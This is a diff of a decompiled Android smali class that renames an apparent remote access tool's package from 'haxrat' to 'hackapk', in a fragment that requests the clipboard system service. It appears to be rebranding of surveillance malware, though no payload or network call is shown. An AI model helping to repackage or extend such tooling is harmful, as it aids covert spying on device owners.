@@ -1,4 +1,4 @@
-.class Lcom/hax4us/haxrat/MainService$100000000;
+.class Lcom/justhack/hackapk/MainService$100000000;
 .super Ljava/lang/Object;
 .source "MainService.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/MainService;
+    value = Lcom/justhack/hackapk/MainService;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -18,11 +18,11 @@
 
 
 # instance fields
-.field private final this$0:Lcom/hax4us/haxrat/MainService;
+.field private final this$0:Lcom/justhack/hackapk/MainService;
 
 
 # direct methods
-.method constructor <init>(Lcom/hax4us/haxrat/MainService;)V
+.method constructor <init>(Lcom/justhack/hackapk/MainService;)V
     .locals 5
 
     move-object v0, p0
@@ -37,19 +37,19 @@
 
     move-object v4, v1
 
-    iput-object v4, v3, Lcom/hax4us/haxrat/MainService$100000000;->this$0:Lcom/hax4us/haxrat/MainService;
+    iput-object v4, v3, Lcom/justhack/hackapk/MainService$100000000;->this$0:Lcom/justhack/hackapk/MainService;
 
     return-void
 .end method
 
-.method static access$0(Lcom/hax4us/haxrat/MainService$100000000;)Lcom/hax4us/haxrat/MainService;
+.method static access$0(Lcom/justhack/hackapk/MainService$100000000;)Lcom/justhack/hackapk/MainService;
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/MainService$100000000;->this$0:Lcom/hax4us/haxrat/MainService;
+    iget-object v3, v3, Lcom/justhack/hackapk/MainService$100000000;->this$0:Lcom/justhack/hackapk/MainService;
 
     move-object v0, v3
 
@@ -72,11 +72,11 @@
 
     move-object v7, v0
 
-    iget-object v7, v7, Lcom/hax4us/haxrat/MainService$100000000;->this$0:Lcom/hax4us/haxrat/MainService;
+    iget-object v7, v7, Lcom/justhack/hackapk/MainService$100000000;->this$0:Lcom/justhack/hackapk/MainService;
 
     const-string v8, "clipboard"
 
-    invoke-virtual {v7, v8}, Lcom/hax4us/haxrat/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+    invoke-virtual {v7, v8}, Lcom/justhack/hackapk/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
 
     move-result-object v7
 
